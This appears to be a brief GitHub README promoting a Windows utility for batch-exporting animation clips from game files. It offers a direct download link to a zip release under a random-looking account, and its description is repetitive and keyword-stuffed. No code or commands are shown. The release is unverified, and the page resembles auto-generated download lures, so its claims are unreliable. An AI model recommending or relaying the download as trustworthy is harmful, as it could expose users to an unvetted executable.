...
<img src="preview.svg" alt="Animation Clip Mass Export" width="100%"/>

# Animation Clip Mass Export

**Animation clip mass export — Windows desktop utility with batch export workflow**
...
**Animation Clip Mass Export** is a Windows-focused desktop utility for **animation clip mass export**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
[![Download](button.svg)](https://github.com/fhkdguc/animation-clip-mass-export-tool/releases/download/v1.11.66/animation-clip-mass-export-tool-v1.11.66.zip)
...
```
animation-clip-mass-export-tool/
├── docs/
│   └── QUICKSTART.md
├── src/
│   └── README.md
